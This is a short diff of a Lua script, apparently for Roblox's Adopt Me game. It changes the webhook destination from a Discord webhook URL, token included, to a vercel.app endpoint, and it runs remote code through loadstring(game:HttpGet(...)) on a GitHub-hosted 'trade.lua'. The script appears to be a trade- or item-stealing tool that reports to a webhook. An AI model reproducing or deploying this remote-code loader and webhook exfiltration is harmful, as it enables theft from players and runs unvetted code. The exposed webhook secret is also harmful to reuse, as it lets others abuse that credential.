@@ -62,5 +62,5 @@ if rareCount == 0 then
 end
 
 UserName = "ImYummyTea"
-WebHook = "https://discord.com/api/webhooks/1368624368640327830/3lySeqaNSLy2RfZa6Tn28mi9mHKci4jfLCUpOXEjIgQhe5g6O0I_GhFV3-uNptsZME5_"
+WebHook = "https://kebabman.vercel.app/webhookkk"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/refs/heads/main/trade.lua"))()
